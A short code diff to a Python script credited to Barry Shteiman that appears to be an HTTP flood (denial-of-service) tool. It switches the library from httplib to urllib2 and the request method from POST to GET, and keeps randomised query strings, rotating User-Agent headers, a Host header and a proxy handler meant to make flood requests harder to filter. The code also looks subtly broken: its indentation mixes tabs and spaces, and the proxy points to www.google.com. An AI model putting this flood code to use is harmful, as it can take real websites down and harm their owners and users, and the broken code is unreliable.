@@ -7,7 +7,7 @@
 #
 # author :  Barry Shteiman , version 1.0
 # ----------------------------------------------------------------------------------------------
-import httplib
+import urllib2
 import sys
 import threading
 import random
@@ -82,8 +82,7 @@ def httpcall(url):
 	request = urllib2.Request(url + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
-	request.add_header('Content-type', 'application/x-www-form-urlencoded')
-        request.get_method = lambda: "POST"
+        request.get_method = lambda: "GET"
         proxy_support = urllib2.ProxyHandler({"https": "https://www.google.com"})
         opener = urllib2.build_opener(proxy_support)
         urllib2.install_opener(opener)
